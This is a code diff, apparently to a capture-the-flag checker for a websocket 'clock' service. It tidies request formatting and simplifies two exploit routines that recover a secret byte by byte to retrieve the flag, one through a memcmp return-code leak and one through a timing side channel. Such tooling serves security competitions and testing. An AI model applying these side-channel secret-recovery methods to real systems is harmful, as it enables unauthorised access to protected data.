@@ -425,12 +425,13 @@ async def create_clock(connection: WsConnection, logger: LoggerAdapter, clock_id
         "task": "create_clock",
         "clockId": f"{clock_id:x}",
         "port": f"{port:x}",
-        "offsetSeconds": np.floor(offset / 1000000000),
+        "offsetSeconds": offset // 1000000000,
         "offsetNanoseconds": offset % 1000000000,
-        "visible": visible,
+        "visible": 1 if visible else 0,
         "authenticationPolicy": policy,
         "userDescription": base64.b64encode(description).decode(),
-        "secret": secret})
+        "secret": secret},
+        separators=(',', ':'))
     
     await connection.send(request)
     response = await connection.receive()
@@ -464,7 +465,8 @@ async def inspect_clock(connection: WsConnection, logger: LoggerAdapter, clock_i
         "task": "inspect_clock",
         "clockId": f"{clock_id:x}",
         "port": f"{port:x}",
-        "secret": secret})
+        "secret": secret},
+        separators=(',', ':'))
     
     await connection.send(request)
     response = await connection.receive()
@@ -1039,7 +1041,8 @@ async def exploit_memcmp(
                 "task": "inspect_clock",
                 "clockId": f"{clock_id:x}",
                 "port": f"{port:x}",
-                "secret": secret})
+                "secret": secret},
+                separators=(',', ':'))
     
             await connection.send(request)
             response = await connection.receive()
@@ -1053,26 +1056,7 @@ async def exploit_memcmp(
 
             return response_decoded["code"]
 
-        guess_0 = await guess_byte(secret)
-        secret += chr(1)
-        guess_1 = await guess_byte(secret)
-        secret = secret[:-1]
-
-        # Check if we skipped a byte
-        if guess_0 == guess_1 + 1 and guess_0 != 10:
-            secret += chr(guess_0)
-        else:
-            secret += chr(10)
-            guess_10 = await guess_byte(secret)
-            secret = secret[:-1]
-
-            # Tiebraker
-            if guess_0 == 1 and guess_10 == 9:
-                secret += chr(1)
-            elif guess_0 == 10 and guess_1 == 9:
-                secret += chr(10)
-            else:
-                secret += chr(0)
+        secret += chr(await guess_byte(secret))
 
     received_description = await inspect_clock(connection, logger, clock_id, port, secret)
     received_flag = searcher.search_flag(received_description)
@@ -1319,7 +1303,7 @@ async def exploit_timing(
         guess, avg_duration, received_flag = await guess_char(bytes(secret))
 
         if received_flag is not None:
-            logger.info(f"Received flag {received_flag} after {i} iterations {np.diff(avg_durations)}")
+            logger.info(f"Received flag {received_flag} after {i} iterations")
             return received_flag
         
         # Backtracking if we made an error due to noise
